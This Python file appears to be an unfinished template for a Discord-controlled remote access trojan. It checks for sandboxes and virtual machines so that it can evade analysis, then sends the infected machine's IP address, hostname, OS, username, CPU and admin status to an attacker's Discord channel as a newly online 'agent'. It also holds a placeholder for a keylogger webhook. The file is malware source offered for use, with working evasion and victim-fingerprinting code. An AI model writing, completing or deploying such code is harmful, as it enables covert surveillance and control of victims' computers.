
import discord
from discord.ext import commands

from datetime import datetime

from libraries import sandboxevasion, maciassdopia


# ========
# Not finished
# ========


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = int("{CHANNEL}")
KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
CURRENT_AGENT = 0

class BOT(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()

        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()

        # Creating welcome message for new client
        my_embed = discord.Embed(title = f"{MSG}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = COLOR)
        my_embed.add_field(name = "**IP**", value = maciassdopia.getIP(), inline = True)
        my_embed.add_field(name = "**Bits**", value = maciassdopia.getBits(), inline = True)
        my_embed.add_field(name = "**HostName**", value = maciassdopia.getHostname(), inline = True)
        my_embed.add_field(name = "**OS**", value = maciassdopia.getOS(), inline = True)
        my_embed.add_field(name = "**Username**", value = maciassdopia.getUsername(), inline = True)
        my_embed.add_field(name = "**CPU**", value = maciassdopia.getCPU(), inline = False)
        my_embed.add_field(name = "**Is Admin**", value = maciassdopia.isAdmin(), inline = True)
        my_embed.add_field(name = "**Is VM**", value = maciassdopia.isVM(), inline = True)
        my_embed.add_field(name = "**Auto Keylogger**", value = False, inline = True)

        await self.channel.send(embed = my_embed)
    
    async def setup_hook(self):
        await self.tree.sync(guild = GUILD)
        
    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title = f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed = my_embed)

bot = BOT()

if sandboxevasion.test() == True and maciassdopia.isVM() == False:
    config = maciassdopia.createConfig()
    ID = maciassdopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    bot.run("{TOKEN}")